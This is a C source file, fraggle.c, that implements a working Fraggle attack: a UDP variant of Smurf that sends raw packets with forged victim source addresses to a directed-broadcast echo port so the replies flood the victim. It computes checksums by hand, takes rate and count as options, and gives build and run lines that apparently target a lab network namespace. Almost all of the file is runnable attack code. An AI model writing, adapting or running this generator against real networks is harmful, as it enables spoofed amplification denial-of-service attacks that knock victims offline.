/* fraggle.c — hand-rolled Fraggle-attack packet generator (UDP Smurf variant).
 *
 * Fraggle is Smurf with UDP instead of ICMP: a spoofed UDP datagram is sent to the
 * UDP echo port (7) of a subnet DIRECTED BROADCAST; every host running an echo
 * service answers the victim, so N hosts turn 1 request into N replies. Same
 * amplification, different protocol -- the router misconfiguration is the real bug.
 *
 * Like smurf.c: raw SOCK_RAW/IPPROTO_RAW socket with IP_HDRINCL; every header field
 * and BOTH checksums computed by hand. The UDP checksum covers a 12-byte
 * pseudo-header (src IP, dst IP, protocol, UDP length) as well (RFC 768).
 *
 * Build:  gcc -O2 -Wall -o fraggle fraggle.c
 * Run  :  ip netns exec attacker ./fraggle <victim_ip> <broadcast_ip> \
 *                                          [dport] [sport] [rate_pps] [count] [payload_bytes]
 * e.g.:   ip netns exec attacker ./fraggle 10.0.20.100 10.0.10.255 7 40000 50 100 0
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

/* 16-bit one's-complement Internet checksum (RFC 1071). */
static unsigned short checksum(const void *buf, int len)
{
    const unsigned char *p = buf;
    unsigned long sum = 0;
    while (len > 1) {
        sum += (unsigned long)((p[0] << 8) | p[1]);  /* big-endian 16-bit word */
        p += 2;
        len -= 2;
    }
    if (len == 1)
        sum += (unsigned long)(p[0] << 8);           /* pad final odd byte */
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main(int argc, char **argv)
{
    if (argc < 3) {
        fprintf(stderr,
            "usage: %s <victim_ip> <broadcast_ip> [dport] [sport] [rate_pps] [count] [payload_bytes]\n",
            argv[0]);
        return 1;
    }
    const char *victim = argv[1];
    const char *bcast  = argv[2];
    int  dport   = (argc > 3) ? atoi(argv[3]) : 7;
    int  sport   = (argc > 4) ? atoi(argv[4]) : 40000;
    int  rate    = (argc > 5) ? atoi(argv[5]) : 50;
    long count   = (argc > 6) ? atol(argv[6]) : 100;
    int  payload = (argc > 7) ? atoi(argv[7]) : 0;
    if (rate <= 0)    rate = 50;
    if (payload < 0)  payload = 0;

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) { perror("socket (need root)"); return 1; }
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    setsockopt(s, SOL_SOCKET, SO_BROADCAST, &one, sizeof(one));

    int  udp_len = (int)sizeof(struct udphdr) + payload;
    int  tot     = (int)sizeof(struct iphdr) + udp_len;
    unsigned char *pkt = calloc(1, tot);
    if (!pkt) { perror("calloc"); return 1; }

    struct iphdr  *ip = (struct iphdr *)pkt;
    struct udphdr *ud = (struct udphdr *)(pkt + sizeof(struct iphdr));
    unsigned char *data = pkt + sizeof(struct iphdr) + sizeof(struct udphdr);
    for (int i = 0; i < payload; i++)
        data[i] = (unsigned char)(0x41 + (i % 26));

    ip->version  = 4;
    ip->ihl      = 5;
    ip->tos      = 0;
    ip->tot_len  = htons(tot);
    ip->id       = htons(0x1234);
    ip->frag_off = 0;
    ip->ttl      = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check    = 0;
    if (inet_pton(AF_INET, victim, &ip->saddr) != 1) { fprintf(stderr, "bad victim ip\n"); return 1; }
    if (inet_pton(AF_INET, bcast,  &ip->daddr) != 1) { fprintf(stderr, "bad broadcast ip\n"); return 1; }
    ip->check = htons(checksum(ip, sizeof(struct iphdr)));

    ud->source = htons((unsigned short)sport);
    ud->dest   = htons((unsigned short)dport);
    ud->len    = htons((unsigned short)udp_len);
    ud->check  = 0;

    /* UDP checksum: pseudo-header + UDP header + payload, in one contiguous buffer. */
    int pslen = 12 + udp_len;
    unsigned char *ps = calloc(1, pslen);
    if (!ps) { perror("calloc"); return 1; }
    memcpy(ps + 0, &ip->saddr, 4);
    memcpy(ps + 4, &ip->daddr, 4);
    ps[8]  = 0;
    ps[9]  = IPPROTO_UDP;
    ps[10] = (unsigned char)((udp_len >> 8) & 0xff);
    ps[11] = (unsigned char)(udp_len & 0xff);
    memcpy(ps + 12, ud, udp_len);
    unsigned short uck = checksum(ps, pslen);
    ud->check = htons(uck ? uck : 0xffff);   /* 0 is transmitted as 0xFFFF */
    free(ps);

    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = ip->daddr;

    struct timespec ts = { .tv_sec = 0, .tv_nsec = 1000000000L / rate };
    long sent = 0;
    printf("fraggle.c: src=%s:%d (spoofed) -> dst=%s:%d  count=%ld rate=%dpps payload=%dB\n",
           victim, sport, bcast, dport, count, rate, payload);
    for (long n = 0; n < count; n++) {
        if (sendto(s, pkt, tot, 0, (struct sockaddr *)&dst, sizeof(dst)) < 0)
            perror("sendto");
        else
            sent++;
        nanosleep(&ts, NULL);
    }
    printf("fraggle.c: sent %ld spoofed UDP echo requests\n", sent);

    free(pkt);
    close(s);
    return 0;
}
